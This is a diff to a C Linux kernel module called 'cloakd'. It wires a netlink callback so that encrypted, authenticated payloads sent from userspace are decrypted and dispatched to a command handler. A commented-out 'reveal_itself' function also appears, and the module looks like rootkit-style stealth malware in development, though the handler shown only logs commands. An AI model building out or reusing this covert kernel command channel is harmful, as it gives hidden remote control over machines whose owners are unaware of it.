@@ -53,6 +53,23 @@ static void reveal_itself(void)
 }
 */
 
+static void process_payload(const u8 *payload)
+{
+    u8 cmd;
+
+    if (!payload)
+        return;
+
+    cmd = payload[0];
+
+    switch (cmd)
+    {
+        //default:    return;
+        default:    printk(KERN_INFO "cloakd: unknown command=0x%x\n", cmd); break;  
+        case 0x01:  printk(KERN_INFO "cloakd: command=0x%x\n", cmd); break;  
+    }
+}
+
 /******************************************************************************
  * Callback - when a netlink packet arrives 
  * the kernel will invoke this function
@@ -60,7 +77,7 @@ static void reveal_itself(void)
 static void nl_recv_cmd(struct sk_buff *sk_buf)
 {
     int pid;
-    unsigned char *encrypted_payload, *decrypted_payload;
+    const u8 *encrypted_payload, *decrypted_payload;
     struct nlmsghdr *msg_hdr;
 
     printk(KERN_INFO "cloakd: netlink command\n");
@@ -68,13 +85,15 @@ static void nl_recv_cmd(struct sk_buff *sk_buf)
     pid = msg_hdr->nlmsg_pid;
     encrypted_payload = nlmsg_data(msg_hdr);
 
-    printk(KERN_INFO "cloakd: pid %d is calling us\n", pid);
-    printk(KERN_INFO "cloakd: encrypted payload=\"%s\"\n", encrypted_payload);
+    printk(KERN_INFO "cloakd: pid [%d] is calling us with encrypted payload:\n", pid);
+    //printk(KERN_INFO "cloakd: encrypted payload=%ph\n", (const void *)encrypted_payload);
+    print_hex_dump(KERN_INFO, "", DUMP_PREFIX_NONE, 16, 1, encrypted_payload, msg_hdr->nlmsg_len - NLMSG_HDRLEN, 1);
 
     decrypted_payload = authenticate_and_decrypt(encrypted_payload);
-    printk(KERN_INFO "cloakd: decrypted payload=\"%s\"\n", decrypted_payload);
+    printk(KERN_INFO "cloakd: decrypted payload:\n");
+    print_hex_dump(KERN_INFO, "", DUMP_PREFIX_NONE, 16, 1, decrypted_payload, ksize(decrypted_payload), 1);
+    process_payload(decrypted_payload);
     kfree(decrypted_payload);
-    //process_payload();
 }
 
 static void netlink_init(void)
